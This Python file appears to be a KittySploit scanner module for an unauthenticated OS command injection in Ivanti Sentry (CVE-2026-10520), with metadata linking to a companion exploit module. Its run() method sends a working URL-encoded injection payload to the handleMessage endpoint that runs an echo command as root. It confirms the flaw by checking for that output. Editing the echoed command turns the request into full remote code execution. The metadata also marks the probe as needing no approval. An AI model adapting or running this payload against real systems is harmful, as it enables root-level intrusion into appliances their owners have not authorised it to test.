#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An OS Command Injection vulnerability in Ivanti Sentry before the R10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ivanti Sentry - OS Command Injection Detection',
        'description': 'An OS Command Injection vulnerability in Ivanti Sentry before the R10.5.2, R10.6.2 and R10.7.1 versions allows a remote unauthenticated user to achieve root-level remote code execution',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'modules': [
            'exploits/linux/http/ivanti_sentry_cve_2026_10520_rce',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'ivanti', 'sentry', 'rce', 'vkev', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2026-10520',
            'https://github.com/watchtowrlabs/watchTowr-vs-Ivanti-Sentry-RCE-CVE-2026-10520-CVE-2026-10523/blob/main/README.md',
        ],
        'cve': 'CVE-2026-10520',
    }

    def run(self):
        path = '/mics/api/v2/sentry/mics-config/handleMessage'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='message=execute%20system%20%2fconfiguration%2fsystem%2fcommandexec%20%3ccommandexec%3e%3cindex%3e1%3c%2findex%3e%3creqandres%3eecho%20CVE-2026-10520%3c%2freqandres%3e%3c%2fcommandexec%3e\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Message handled successfully', 'CVE-2026-10520',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Ivanti Sentry - OS Command Injection detected', path=path)
            return True
        return False

